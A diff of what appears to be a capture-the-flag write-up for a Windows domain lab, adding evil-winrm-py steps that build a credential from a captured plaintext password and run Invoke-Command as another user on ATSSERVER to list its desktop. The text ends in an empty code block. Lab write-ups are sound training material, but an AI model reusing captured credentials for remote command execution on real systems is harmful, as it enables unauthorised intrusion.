@@ -432,6 +432,8 @@ There also isnt much in bloodhound
 
 # Command execution on `ATSSERVER` from `Acute-PC01`
 
+Since my meterpreter session is busy tuin
+
 ```python
 evil-winrm-py PS C:\Users\edavies\Documents> $pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
 evil-winrm-py PS C:\Users\edavies\Documents> $cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks", $pass)
@@ -448,7 +450,28 @@ Ill use the credential object to run a command as that user on the ATSSERVER
 
 I used `dc_manage` because this was what `edavies` was using when i captured his credentials in the powershell session
 
+```python
+evil-winrm-py PS C:\Users\edavies\Documents> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {ls C:\Users\
+imonks\Desktop} -Credential $cred -ConfigurationName dc_manage
 
+
+    Directory: C:\Users\imonks\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                PSComputerName                    
+----                 -------------         ------ ----                                --------------                    
+-ar---        10/22/2026   4:24 PM             34 user.txt                            ATSSERVER                         
+-a----         1/11/2022   6:04 PM            602 wm.ps1                              ATSSERVER                         
+
+
+evil-winrm-py PS C:\Users\edavies\Documents>
+```
+
+There is an interesting file on the desktop
+
+```python
+
+```
 
 
 
